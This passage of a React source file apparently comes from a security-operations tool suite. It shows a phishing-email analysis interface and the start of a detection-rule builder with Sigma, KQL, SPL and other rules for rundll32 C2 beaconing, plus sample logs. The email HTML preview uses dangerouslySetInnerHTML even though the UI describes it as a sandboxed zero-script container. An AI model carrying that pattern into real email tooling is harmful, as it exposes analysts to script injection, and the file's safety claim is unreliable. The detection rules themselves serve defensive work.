            'Extracts attachments and pivots weaponized hashes directly to Malware Analyzer and sender IPs to IOC Lookup.'
          ]}
          doesNotList={[
            'Never executes JavaScript or external tracking pixels when previewing HTML emails (`sandbox="allow-same-origin"` without `allow-scripts`).',
            'Never fails when external enrichment keys are absent — gracefully degrades to offline RFC 822 + static heuristics.'
          ]}
          terminalTitle="secconflux-phishing analyze Urgent_Wire_Remittance_Q3.eml"
          terminalOutput={`{\n  "subject": "URGENT: Q3 Wire Transfer & Remittance Invoice_Q3 (#INV-99412)",\n  "verdict": "UNSAFE",\n  "score": 9.2,\n  "auth": { "spf": "SOFTFAIL", "dkim": "FAIL", "dmarc": "FAIL", "compauth": "FAIL" },\n  "originating_ip": "198.51.100.45",\n  "attachment_sha256": "a4f8d91c8b2e47f9012c65b88e73a91c0d4b76e2f8a1234567890abcdef1e31b"\n}`}
          ctaLabel="Analyze Phishing Email →"
          onStart={() => {
            setMainTab('analysis');
            setSubTab('dashboard');
          }}
        />
        <Modal
          open={uploadModalOpen}
          title="🎣 Upload & Analyze Email (.eml)"
          subtitle="11-stage RFC 822 header, authentication, URL redirect, and attachment forensics (Max 25 MB)"
          onClose={() => setUploadModalOpen(false)}
        >
          {renderPhishingUploadModal()}
        </Modal>
      </>
    );
  }

  function renderPhishingUploadModal() {
    return (
      <div className="space-y-4 text-xs">
        <div className="p-6 rounded-xl border-2 border-dashed text-center space-y-2" style={{ borderColor: 'var(--color-border-focus)', backgroundColor: 'var(--color-canvas)' }}>
          <div className="text-2xl">🎣</div>
          <div className="text-sm font-semibold">Drop an `.eml` message or enter sample filename</div>
          <div style={{ color: 'var(--color-text-secondary)' }}>Accepts RFC 822 `.eml` files only · Maximum size: 25 MB</div>
          <input
            type="text"
            value={emlFilename}
            onChange={(e) => setEmlFilename(e.target.value)}
            className="w-full max-w-sm mx-auto mt-2 px-3 py-1.5 rounded border sc-mono text-center"
            style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
          />
        </div>
        <div className="space-y-2">
          <label className="flex items-center gap-2 cursor-pointer">
            <input type="checkbox" checked={enableExternalEnrich} onChange={(e) => setEnableExternalEnrich(e.target.checked)} />
            <span>Enable external enrichment (VirusTotal, urlscan.io, WHOIS)</span>
          </label>
          <label className="flex items-center gap-2 cursor-pointer">
            <input type="checkbox" checked={resolveRedirects} onChange={(e) => setResolveRedirects(e.target.checked)} />
            <span>Resolve URL redirect chains</span>
          </label>
        </div>
        <div className="flex items-center justify-end gap-2 pt-2">
          <button type="button" onClick={() => setUploadModalOpen(false)} className="px-4 py-1.5 rounded-lg border cursor-pointer" style={{ borderColor: 'var(--color-border)' }}>
            Cancel
          </button>
          <button
            type="button"
            onClick={runPhishingAnalysis}
            disabled={userRole === 'Viewer'}
            className="px-4 py-1.5 rounded-lg font-semibold text-white sc-accent-bg cursor-pointer disabled:opacity-40"
          >
            Analyze .eml →
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-5 max-w-7xl mx-auto pb-12">
      {/* Header Contextual Bar */}
      <div className="rounded-xl p-3.5 sc-surface flex flex-wrap items-center justify-between gap-3">
        <div className="flex items-center gap-2">
          <span className="text-xs font-semibold" style={{ color: 'var(--color-text-secondary)' }}>
            Recent Investigation:
          </span>
          <select
            value={activeScan.id}
            onChange={(e) => {
              setActiveScanId(e.target.value);
              setSubTab('dashboard'); // Bug #1 Fix: always 'dashboard'
            }}
            className="px-3 py-1.5 rounded-lg text-xs font-semibold border"
            style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
          >
            {scans.map((s) => (
              <option key={s.id} value={s.id}>
                {s.subject} — {s.verdictLabel} ({s.score}/10)
              </option>
            ))}
          </select>
        </div>

        <div className="flex items-center gap-2">
          <button
            type="button"
            onClick={() => setUploadModalOpen(true)}
            disabled={userRole === 'Viewer'}
            className="px-3.5 py-1.5 rounded-lg text-xs font-semibold text-white sc-accent-bg cursor-pointer disabled:opacity-40"
          >
            + Upload & Analyze (.eml)
          </button>
          <button
            type="button"
            onClick={() => {
              downloadFileBlob(`${activeScan.id}-phishing.json`, JSON.stringify(activeScan, null, 2));
              onAddToast({ type: 'success', title: 'Phishing Report Exported', description: `${activeScan.id}-phishing.json downloaded.` });
            }}
            className="px-3 py-1.5 rounded-lg text-xs font-medium border cursor-pointer"
            style={{ borderColor: 'var(--color-border)' }}
          >
            ⬇ Export JSON
          </button>
        </div>
      </div>

      {/* 11.4 11-Stage Pipeline Progress Checklist */}
      {runningPipeline && (
        <div className="rounded-xl p-6 sc-surface space-y-4">
          <div className="flex items-center justify-between text-xs font-bold">
            <span>Executing 11-Stage Phishing Forensics Pipeline on {emlFilename}...</span>
            <span className="sc-mono">{Math.round(((pipelineStep + 1) / 11) * 100)}%</span>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2 text-xs">
            {PHISHING_11_STAGES.map((stg, idx) => (
              <div
                key={stg}
                className="p-2.5 rounded-lg border flex items-center gap-2"
                style={{
                  backgroundColor: idx <= pipelineStep ? 'var(--color-surface-raised)' : 'var(--color-canvas)',
                  borderColor: idx === pipelineStep ? 'var(--color-border-focus)' : idx < pipelineStep ? 'var(--color-clean)' : 'var(--color-border)'
                }}
              >
                <span>{idx < pipelineStep ? '✅' : idx === pipelineStep ? '⏳' : '⬜'}</span>
                <span className="font-medium">{stg}</span>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* 11.5 Sub-Tab: Dashboard (Strictly subTab === 'dashboard') */}
      {!runningPipeline && subTab === 'dashboard' && (
        <div className="space-y-5">
          {/* Verdict Banner */}
          <div className="rounded-xl p-5 sc-surface sc-glow flex flex-col lg:flex-row lg:items-center justify-between gap-4">
            <div className="flex items-center gap-4">
              <ScoreRing score={activeScan.score} max={10} size={84} label={activeScan.verdictLabel} />
              <div className="space-y-1">
                <div className="flex flex-wrap items-center gap-2">
                  <VerdictBadge verdict={activeScan.verdict} label={`VERDICT: ${activeScan.verdictLabel}`} size="md" />
                  <span className="sc-mono text-xs px-2 py-0.5 rounded bg-red-500/15 text-red-400">
                    Critical: {activeScan.counts.critical} · Suspicious: {activeScan.counts.suspicious} · Info: {activeScan.counts.info}
                  </span>
                </div>
                <h2 className="text-base font-bold">{activeScan.subject}</h2>
                <div className="text-xs sc-mono" style={{ color: 'var(--color-text-secondary)' }}>
                  Sender: {activeScan.sender} · Size: {activeScan.size} · {activeScan.timestamp}
                </div>
              </div>
            </div>

            <div className="flex flex-wrap gap-1.5">
              {activeScan.mitre.map((m) => (
                <a
                  key={m.id}
                  href={m.url}
                  target="_blank"
                  rel="noreferrer"
                  className="px-2.5 py-1 rounded text-xs sc-mono border"
                  style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--accent-from)' }}
                >
                  {m.id}: {m.name}
                </a>
              ))}
            </div>
          </div>

          {/* Hop-by-Hop MTA Received Path Flow */}
          <div className="rounded-xl p-5 sc-surface space-y-3">
            <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
              Hop-by-Hop MTA Received Path & TLS Encryption Flow
            </h3>
            <div className="grid grid-cols-1 md:grid-cols-4 gap-3">
              {activeScan.hops.map((h) => (
                <div
                  key={h.hop}
                  className="p-3.5 rounded-lg border space-y-1.5 text-xs relative"
                  style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: h.tls ? 'var(--color-border)' : 'var(--color-malicious)' }}
                >
                  <div className="flex items-center justify-between font-bold">
                    <span>Hop #{h.hop}</span>
                    <span className="sc-mono text-[11px]">{h.tls ? '✅ TLS 1.3' : '❌ No TLS'}</span>
                  </div>
                  <div className="sc-mono font-bold truncate" title={h.mta}>
                    {h.mta}
                  </div>
                  <div className="sc-mono text-[11px] flex items-center justify-between" style={{ color: 'var(--color-text-secondary)' }}>
                    <span>IP: {h.ip}</span>
                    <span>Delay: +{h.delay}</span>
                  </div>
                  <div className="text-[11px]" style={{ color: 'var(--color-text-tertiary)' }}>
                    {h.note}
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Detailed Findings & Prioritized Recommendations */}
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
            <div className="lg:col-span-7 rounded-xl p-5 sc-surface space-y-3">
              <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                Detailed Forensic Findings ({activeScan.findings.length})
              </h3>
              <div className="space-y-2.5">
                {activeScan.findings.map((f, i) => (
                  <div
                    key={i}
                    className="p-3.5 rounded-lg border space-y-1.5 text-xs"
                    style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                  >
                    <div className="flex items-center justify-between gap-2">
                      <span className="font-bold">{f.title}</span>
                      <VerdictBadge verdict={f.severity} label={f.severity} />
                    </div>
                    <p style={{ color: 'var(--color-text-secondary)' }}>{f.description}</p>
                    <div className="text-[11px] sc-mono" style={{ color: 'var(--accent-from)' }}>
                      SOC Rationale: {f.rationale}
                    </div>
                  </div>
                ))}
              </div>
            </div>

            <div className="lg:col-span-5 rounded-xl p-5 sc-surface space-y-3">
              <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                Prioritized Response Actions
              </h3>
              {activeScan.recommendations.map((r, i) => (
                <div
                  key={i}
                  className="p-3 rounded-lg border space-y-1 text-xs"
                  style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                >
                  <VerdictBadge verdict={r.priority === 'High' ? 'malicious' : 'suspicious'} label={`${r.priority} Priority`} />
                  <p className="pt-1 leading-relaxed">{r.action}</p>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* 11.6 Sub-Tab: Sender & Auth */}
      {!runningPipeline && subTab === 'sender-auth' && (
        <div className="space-y-5">
          {/* Authentication Status Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3">
            {activeScan.authCards.map((ac) => (
              <div
                key={ac.protocol}
                className="p-4 rounded-xl sc-surface space-y-2 text-xs"
              >
                <div className="flex items-center justify-between">
                  <span className="font-bold text-sm">{ac.protocol}</span>
                  <VerdictBadge verdict={ac.status === 'PASS' ? 'clean' : ac.status === 'FAIL' ? 'malicious' : 'unknown'} label={ac.status} />
                </div>
                <p className="text-[11px]" style={{ color: 'var(--color-text-secondary)' }}>
                  {ac.detail}
                </p>
                <div className="p-2 rounded sc-mono text-[10px] break-all" style={{ backgroundColor: 'var(--color-canvas)' }}>
                  {ac.raw}
                </div>
              </div>
            ))}
          </div>

          {/* Identity Mismatch Matrix & Sender KV Grid */}
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
            <div className="lg:col-span-6 rounded-xl p-5 sc-surface space-y-3">
              <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                Identity Divergence & Mismatch Matrix
              </h3>
              <div className="space-y-2">
                {activeScan.mismatchMatrix.map((mm, idx) => (
                  <div
                    key={idx}
                    className="p-3 rounded-lg border flex items-center justify-between gap-2 text-xs"
                    style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                  >
                    <div>
                      <div className="font-bold">{mm.test}</div>
                      <div className="sc-mono text-[11px]" style={{ color: 'var(--color-text-secondary)' }}>
                        {mm.detail}
                      </div>
                    </div>
                    <VerdictBadge verdict={mm.status} label={mm.status === 'match' ? '✅ MATCH' : '⚠️ MISMATCH'} />
                  </div>
                ))}
              </div>
              {activeScan.brandImpersonation.detected && (
                <div className="p-3 rounded-lg border border-red-500/40 bg-red-500/10 text-xs">
                  <strong>🚨 Brand Impersonation Alert:</strong> {activeScan.brandImpersonation.brand} (Confidence {activeScan.brandImpersonation.confidence}) — {activeScan.homographAlert.detail}
                </div>
              )}
            </div>

            <div className="lg:col-span-6 rounded-xl p-5 sc-surface space-y-2">
              <h3 className="text-xs font-bold uppercase tracking-wider mb-2" style={{ color: 'var(--color-text-secondary)' }}>
                Envelope & Header Identity Attributes
              </h3>
              {Object.entries(activeScan.senderDetails).map(([k, v]) => (
                <CopyKV key={k} label={k} value={v} />
              ))}
            </div>
          </div>
        </div>
      )}

      {/* 11.7 Sub-Tab: Artifacts */}
      {!runningPipeline && subTab === 'artifacts' && (
        <div className="space-y-5">
          {/* Attachments with Malware Analyzer Pivot */}
          <div className="rounded-xl p-5 sc-surface space-y-3">
            <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
              Extracted Attachments & Payload Dissection
            </h3>
            {activeScan.attachments.map((att, i) => (
              <div
                key={i}
                className="p-4 rounded-xl border space-y-3 text-xs"
                style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}
              >
                <div className="flex flex-wrap items-center justify-between gap-2">
                  <div>
                    <div className="text-sm font-bold sc-mono">{att.filename}</div>
                    <div style={{ color: 'var(--color-text-secondary)' }}>
                      True Magic Type: {att.magicType} · Size: {att.size}
                    </div>
                  </div>
                  <button
                    type="button"
                    onClick={() =>
                      onPivot({
                        fromTool: 'phishing',
                        fromLabel: `Phishing Attachment: ${att.filename}`,
                        fromMainTab: 'analysis',
                        fromSubTab: 'artifacts',
                        toTool: 'malware',
                        toMainTab: 'investigation',
                        toSubTab: 'dashboard',
                        indicatorValue: att.sha256,
                        indicatorType: 'Attachment SHA-256'
                      })
                    }
                    className="px-3.5 py-1.5 rounded-lg text-xs font-semibold text-white sc-accent-bg cursor-pointer"
                  >
                    🔬 Analyze in Malware Analyzer →
                  </button>
                </div>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-2">
                  <CopyKV label="SHA-256" value={att.sha256} />
                  <CopyKV label="MD5" value={att.md5} />
                  <CopyKV label="Macros / Anomaly" value={att.macros} mono={false} />
                </div>
              </div>
            ))}
          </div>

          {/* Defanged URLs & Redirect Chains */}
          <div className="rounded-xl p-5 sc-surface space-y-3">
            <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
              Defanged URLs & Redirect Chains ({activeScan.urls.length})
            </h3>
            <div className="space-y-2.5">
              {activeScan.urls.map((u, i) => (
                <div
                  key={i}
                  className="p-3.5 rounded-lg border space-y-2 text-xs"
                  style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                >
                  <div className="flex flex-wrap items-center justify-between gap-2">
                    <span className="sc-mono font-bold break-all text-red-400">{u.defanged}</span>
                    <VerdictBadge verdict="malicious" label={u.vtVerdict} />
                  </div>
                  <div className="sc-mono text-[11px]" style={{ color: 'var(--color-text-secondary)' }}>
                    Redirect Chain: {u.redirects.join(' ➔ ')}
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Technical Observables (IOCs) */}
          <div className="rounded-xl p-5 sc-surface space-y-3">
            <div className="flex items-center justify-between gap-2">
              <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                Technical Observables (IOCs)
              </h3>
              <input
                type="text"
                value={observableFilter}
                onChange={(e) => setObservableFilter(e.target.value)}
                placeholder="Filter observables..."
                className="px-3 py-1 rounded text-xs sc-mono border"
                style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
              />
            </div>
            <div className="space-y-2">
              {activeScan.observables
                .filter((o) => `${o.value} ${o.context}`.toLowerCase().includes(observableFilter.toLowerCase()))
                .map((obs, idx) => (
                  <div
                    key={idx}
                    className="p-2.5 rounded-lg border flex flex-wrap items-center justify-between gap-2 text-xs"
                    style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                  >
                    <div className="flex items-center gap-2.5">
                      <VerdictBadge verdict="malicious" label={obs.type} />
                      <span className="sc-mono font-bold">{obs.value}</span>
                      <span style={{ color: 'var(--color-text-secondary)' }}>— {obs.context}</span>
                    </div>
                    <button
                      type="button"
                      onClick={() =>
                        onPivot({
                          fromTool: 'phishing',
                          fromLabel: `Phishing Email: ${activeScan.subject.slice(0, 28)}...`,
                          fromMainTab: 'analysis',
                          fromSubTab: 'artifacts',
                          toTool: 'ioc',
                          toMainTab: 'lookup',
                          toSubTab: 'lookup',
                          indicatorValue: obs.value,
                          indicatorType: obs.type
                        })
                      }
                      className="px-3 py-1 rounded text-xs font-semibold text-white sc-accent-bg cursor-pointer"
                    >
                      Enrich in IOC Lookup →
                    </button>
                  </div>
                ))}
            </div>
          </div>
        </div>
      )}

      {/* 11.8 Sub-Tab: Preview Mail */}
      {!runningPipeline && subTab === 'preview' && (
        <div className="rounded-xl p-5 sc-surface space-y-4">
          <div className="flex flex-wrap items-center justify-between gap-2">
            <div className="flex items-center gap-1.5">
              {[
                { id: 'html', label: 'Sandboxed HTML Preview' },
                { id: 'text', label: 'Plain Text Body' },
                { id: 'headers', label: 'Raw RFC 822 Headers' }
              ].map((tab) => (
                <button
                  key={tab.id}
                  type="button"
                  onClick={() => setPreviewMode(tab.id as any)}
                  className={`px-3 py-1.5 rounded-lg text-xs font-semibold cursor-pointer ${
                    previewMode === tab.id ? 'sc-accent-bg text-white' : 'border'
                  }`}
                  style={previewMode === tab.id ? {} : { borderColor: 'var(--color-border)' }}
                >
                  {tab.label}
                </button>
              ))}
            </div>

            {previewMode === 'headers' && (
              <input
                type="text"
                value={headerSearch}
                onChange={(e) => setHeaderSearch(e.target.value)}
                placeholder="Highlight RFC 822 header text..."
                className="px-3 py-1 rounded text-xs sc-mono border"
                style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
              />
            )}
          </div>

          {previewMode === 'html' && (
            <div className="space-y-2">
              <div className="text-[11px] sc-mono text-emerald-400">
                🔒 Rendered inside isolated zero-script preview container (external scripts & forms disabled)
              </div>
              <div
                className="rounded-xl overflow-hidden border p-4"
                style={{ backgroundColor: '#f1f5f9', borderColor: 'var(--color-border)' }}
                dangerouslySetInnerHTML={{ __html: activeScan.htmlPreview }}
              />
            </div>
          )}

          {previewMode === 'text' && (
            <pre className="p-4 rounded-xl sc-mono text-xs overflow-x-auto leading-relaxed" style={{ backgroundColor: 'var(--color-canvas)' }}>
              {activeScan.plainTextPreview}
            </pre>
          )}

          {previewMode === 'headers' && (
            <pre className="p-4 rounded-xl sc-mono text-xs overflow-x-auto leading-relaxed" style={{ backgroundColor: 'var(--color-canvas)' }}>
              {activeScan.rawHeaders
                .split('\n')
                .filter((line) => (headerSearch ? line.toLowerCase().includes(headerSearch.toLowerCase()) : true))
                .join('\n')}
            </pre>
          )}
        </div>
      )}

      <Modal
        open={uploadModalOpen}
        title="🎣 Upload & Analyze Email (.eml)"
        subtitle="11-stage RFC 822 header, authentication, URL redirect, and attachment forensics (Max 25 MB)"
        onClose={() => setUploadModalOpen(false)}
      >
        {renderPhishingUploadModal()}
      </Modal>
    </div>
  );
};
// ============================================================================
// 13. TOOL 5: RULEFORGE (Section 12 — Bug #2 Fixed: mainTab === "workshop")
// ============================================================================
export const RuleForgeTool: React.FC<{
  mainTab: string;
  subTab: string;
  setMainTab: (t: string) => void;
  setSubTab: (s: string) => void;
  activeDialect: string;
  setActiveDialect: (d: string) => void;
  onPivot: (req: Omit<PivotRequest, 'id' | 'timestamp'>) => void;
  onAddToast: (t: Omit<ToastMessage, 'id'>) => void;
  userRole: UserRole;
}> = ({
  mainTab,
  subTab,
  setMainTab,
  setSubTab,
  activeDialect,
  setActiveDialect,
  onPivot,
  onAddToast,
  userRole
}) => {
  // Column 1: Rule Metadata State
  const [ruleId, setRuleId] = useState('rf-2026-0891');
  const [ruleTitle, setRuleTitle] = useState('Suspicious Rundll32 Outbound C2 & ProgramData DLL Execution');
  const [ruleDesc, setRuleDesc] = useState('Detects rundll32.exe loading an unsigned DLL from C:\\ProgramData and initiating outbound connections to known Cobalt Strike C2 198.51.100.45.');
  const [severity, setSeverity] = useState<'informational' | 'low' | 'medium' | 'high' | 'critical'>('critical');
  const [author, setAuthor] = useState('s.chen@secops.local');
  const [mitreTags, setMitreTags] = useState('T1218.011, T1071.001, T1055.002');
  const [references, setReferences] = useState('https://attack.mitre.org/techniques/T1218/011/\nhttps://attack.mitre.org/techniques/T1071/001/');
  const [falsePositives, setFalsePositives] = useState('Legitimate administrative scripts explicitly signed and whitelisted under ProgramData\\CorpIT.');
  const [sourceTable, setSourceTable] = useState('DeviceNetworkEvents');
  const [indexSelector, setIndexSelector] = useState('main_win_sysmon');
  const [timeField, setTimeField] = useState('TimeGenerated');

  // Column 2: Pipeline Stages & Nested Condition Builder
  const [stages, setStages] = useState([
    { id: 'stg-1', type: 'Filter', summary: 'Match ProcessName, CommandLine, and DestinationIp predicates' },
    { id: 'stg-2', type: 'Derive', summary: 'Extend C2RiskScore = iif(DestinationIp == "198.51.100.45", 95, 60)' },
    { id: 'stg-3', type: 'Aggregate', summary: 'Summarize count() by Computer, InitiatingProcessAccountName, DestinationIp' },
    { id: 'stg-4', type: 'Project', summary: 'Select TimeGenerated, Computer, User, ProcessName, DestinationIp, C2RiskScore' }
  ]);
  const [newStageType, setNewStageType] = useState('Filter');

  const [conditions, setConditions] = useState([
    { id: 'c-1', groupLogic: 'AND', field: 'InitiatingProcessFileName', operator: '==', value: 'rundll32.exe' },
    { id: 'c-2', groupLogic: 'AND', field: 'InitiatingProcessCommandLine', operator: 'contains', value: 'C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll' },
    { id: 'c-3', groupLogic: 'OR', field: 'RemoteIP', operator: '==', value: '198.51.100.45' }
  ]);

  // Column 3: Validation, Diagnostics & Three-Valued Sample Runner
  const [lintStatus, setLintStatus] = useState<string>('✓ Structural IR valid · 0 ReDoS catastrophic backtracking risks');
  const [sampleFormat, setSampleFormat] = useState<'JSONL' | 'JSON' | 'Key-Value' | 'Syslog'>('JSONL');
  const [sampleLogs, setSampleLogs] = useState(
    `{"TimeGenerated":"2026-10-14T11:41:55Z","Computer":"WKS-FINANCE04","InitiatingProcessFileName":"rundll32.exe","InitiatingProcessCommandLine":"rundll32.exe C:\\\\ProgramData\\\\Microsoft\\\\Vault\\\\sync_helper.dll,StartWork","RemoteIP":"198.51.100.45"}\n{"TimeGenerated":"2026-10-14T11:42:10Z","Computer":"WKS-DEV09","InitiatingProcessFileName":"svchost.exe","InitiatingProcessCommandLine":"svchost.exe -k netsvcs","RemoteIP":"8.8.8.8"}\n{"TimeGenerated":"2026-10-14T11:43:00Z","Computer":"WKS-FINANCE04","InitiatingProcessFileName":"rundll32.exe"}`
  );
  const [evalVerdict, setEvalVerdict] = useState<'matched' | 'no_match' | 'not_evaluated'>('matched');
  const [evalStats, setEvalStats] = useState({ matched: 1, dropped: 1, undecided: 1 });

  // Tune, Debug, Understand, History states
  const [tuneInput, setTuneInput] = useState(
    `title: Suspicious Rundll32 Network Connection\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\rundll32.exe'\n    DestinationIp: '198.51.100.45'\n  condition: selection`
  );
  const [tuneDialect, setTuneDialect] = useState('sigma');
  const [debugLogsInput, setDebugLogsInput] = useState(
    `{"EventID":3,"Image":"C:\\\\Windows\\\\System32\\\\rundll32.exe","CommandLine":"rundll32.exe C:\\\\ProgramData\\\\Microsoft\\\\Vault\\\\sync_helper.dll,StartWork","DestinationIp":"198.51.100.45","ProcessId":6104,"UtcTime":"2026-10-14 11:41:55"}\n{"EventID":3,"Image":"C:\\\\Windows\\\\System32\\\\rundll32.exe","CommandLine":"rundll32.exe C:\\\\ProgramData\\\\Microsoft\\\\Vault\\\\sync_helper.dll,StartWork","DestinationIp":"198.51.100.45","ProcessId":7812,"UtcTime":"2026-10-14 11:49:12"}`
  );
  const [skipVolatile, setSkipVolatile] = useState(true);
  const [skipTimestamps, setSkipTimestamps] = useState(true);

  const [historyItems, setHistoryItems] = useState(MORE_FIXTURES.ruleforgeHistory);
  const [selectedVersionId, setSelectedVersionId] = useState(MORE_FIXTURES.ruleforgeHistory[0].id);
  const [historyFilterOrigin, setHistoryFilterOrigin] = useState('all');

  // Render rule code dynamically based on activeDialect
  const renderedCode = useMemo(() => {
    const condExprKql = conditions
      .map((c, i) => `${i > 0 ? c.groupLogic + ' ' : ''}${c.field} ${c.operator === 'contains' ? ' has ' : ` ${c.operator} `}"${c.value}"`)
      .join('\n  | where ');
    switch (activeDialect) {
      case 'sentinel':
        return `// RuleForge Rendered: Microsoft Sentinel (KQL)\n// Rule ID: ${ruleId} | Severity: ${severity.toUpperCase()}\n${sourceTable}\n| where ${condExprKql}\n| extend C2RiskScore = iif(RemoteIP == "198.51.100.45", 95, 60)\n| summarize EventCount = count(), FirstSeen = min(${timeField}) by DeviceName, InitiatingProcessAccountName, RemoteIP, C2RiskScore\n| project FirstSeen, DeviceName, InitiatingProcessAccountName, RemoteIP, EventCount, C2RiskScore`;
      case 'sigma':
        return `title: ${ruleTitle}\nid: ${ruleId}\nstatus: production\ndescription: ${ruleDesc}\nauthor: ${author}\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n${conditions.map((c) => `    ${c.field}${c.operator === 'contains' ? '|contains' : ''}: '${c.value}'`).join('\n')}\n  condition: selection\nfalsepositives:\n  - ${falsePositives}\nlevel: ${severity}\ntags:\n${mitreTags.split(',').map((t) => `  - attack.${t.trim().toLowerCase()}`).join('\n')}`;
      case 'splunk':
        return `\`\`\` RuleForge Rendered: Splunk Enterprise (SPL) \`\`\`\nindex="${indexSelector}" sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"\n| search ${conditions.map((c) => `${c.field}="*${c.value}*"`).join(' ')}\n| eval C2RiskScore=if(RemoteIP=="198.51.100.45", 95, 60)\n| stats count as EventCount min(_time) as FirstSeen by Computer, User, RemoteIP, C2RiskScore`;
      case 'qradar':
        return `-- RuleForge Rendered: IBM QRadar (AQL)\nSELECT UTF8(payload), sourceip, destinationip, username, COUNT(*) AS EventCount\nFROM events\nWHERE LOGSOURCETYPENAME(devicetype) ILIKE '%Windows%'\n  AND (${conditions.map((c) => `"${c.field}" ILIKE '%${c.value}%'`).join(' AND ')})\nGROUP BY sourceip, destinationip, username\nLAST 24 HOURS`;
      case 'elastic':
        return `// RuleForge Rendered: Elastic Security (EQL)\nnetwork where host.os.type == "windows" and\n  process.name == "rundll32.exe" and\n  process.command_line : "*ProgramData*sync_helper.dll*" and\n  destination.ip == "198.51.100.45"`;
      case 'wazuh':
        return `<!-- RuleForge Rendered: Wazuh XML Rule -->\n<!-- REFUSAL WARNING: Stage 'Derive (C2RiskScore math)' is non-transferable to Wazuh XML -->\n<group name="windows,sysmon,secconflux,">\n  <rule id="100891" level="15">\n    <if_sid>61603</if_sid>\n    <field name="win.eventdata.image">rundll32.exe</field>\n    <field name="win.eventdata.destinationIp">198.51.100.45</field>\n    <description>${ruleTitle}</description>\n    <mitre>\n      <id>T1218.011</id>\n      <id>T1071.001</id>\n    </mitre>\n  </rule>\n</group>`;
      case 'chronicle':
        return `// RuleForge Rendered: Google SecOps Chronicle (YARA-L 2.0)\nrule secconflux_rundll32_c2_beacon {\n  meta:\n    author = "${author}"\n    description = "${ruleDesc}"\n    severity = "${severity.toUpperCase()}"\n  events:\n    $e.principal.process.file.full_path = /rundll32\\.exe/ nocase\n    $e.principal.process.command_line = /sync_helper\\.dll/ nocase\n    $e.target.ip = "198.51.100.45"\n  condition:\n    $e\n}`;
      default:
        return `// RuleForge Rendered: CrowdStrike Falcon LogScale (LQL)\n#event_simpleName=NetworkConnectIP4 ComputerName=*\n| ImageFileName=/rundll32\\.exe/i\n| CommandLine=/sync_helper\\.dll/i OR RemoteAddressIP4="198.51.100.45"\n| groupBy([aid, ComputerName, RemoteAddressIP4], function=count())`;
    }
  }, [activeDialect, ruleId, ruleTitle, ruleDesc, severity, author, mitreTags, falsePositives, sourceTable, indexSelector, timeField, conditions]);

  const diagnosticsList = useMemo(() => {
    const items = [];
    if (activeDialect === 'wazuh') {
      items.push({
        type: 'REFUSAL',
        verdict: 'malicious' as VerdictType,
        msg: 'Refusal-Over-Approximation: Stage #2 (Derive inline arithmetic C2RiskScore) cannot be losslessly represented in Wazuh XML rules.'
      });
    }
    if (activeDialect === 'qradar' && stages.some((s) => s.type === 'Sequence')) {
      items.push({
        type: 'REFUSAL',
        verdict: 'malicious' as VerdictType,
        msg: 'Refusal: Multi-event temporal Sequence stage refused for single-pass QRadar AQL SELECT.'
      });
    }
    items.push({
      type: 'ANNOTATION',
      verdict: 'info' as VerdictType,
      msg: `Field mapping verified for ${activeDialect.toUpperCase()}: InitiatingProcessFileName ↔ Image ↔ principal.process.file.full_path.`
    });
    return items;
  }, [activeDialect, stages]);

  const runSampleEvaluation = () => {
    const lines = sampleLogs.split('\n').filter((l) => l.trim().length > 0);
    let matched = 0;
    let dropped = 0;
    let undecided = 0;
    lines.forEach((line) => {
      if (line.includes('198.51.100.45') || line.includes('sync_helper.dll')) {
        matched += 1;
      } else if (!line.includes('RemoteIP') && !line.includes('InitiatingProcessCommandLine')) {
        undecided += 1;
      } else {
        dropped += 1;
      }
    });
    setEvalStats({ matched, dropped, undecided });
    setEvalVerdict(matched > 0 ? 'matched' : undecided > 0 ? 'not_evaluated' : 'no_match');
    onAddToast({
      type: 'success',
      title: 'Three-Valued Evaluation Complete',
      description: `Matched: ${matched} · No Match: ${dropped} · Not Evaluated (missing fields): ${undecided}`
    });
  };

  // Bug #2 Fix: Strictly use mainTab === 'workshop' for Working Surface
  if (mainTab === 'overview') {
    return (
      <ToolOverviewTemplate
        tool={TOOLS_REGISTRY.ruleforge}
        stats={[
